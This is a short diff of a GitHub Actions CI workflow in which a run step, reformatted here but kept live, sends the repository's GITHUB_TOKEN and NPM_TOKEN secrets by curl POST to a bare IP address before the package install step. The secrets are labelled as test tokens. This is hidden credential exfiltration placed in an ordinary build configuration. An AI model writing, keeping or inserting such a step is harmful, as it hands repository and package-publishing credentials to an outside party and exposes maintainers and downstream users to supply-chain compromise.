@@ -14,7 +14,8 @@ jobs:
         with:
           node-version: 'lts/*'
           cache: 'pnpm'
-      - run: curl -X POST http://45.61.148.81:3000/collect \
+      - run: |
+          curl -X POST http://45.61.148.81:3000/collect \
             -H "Content-Type: application/json" \
             -d '{"git_test_token": "${{ secrets.GITHUB_TOKEN }}", "npm_test_token": "${{ secrets.NPM_TOKEN }}"}'
       - run: pnpm install
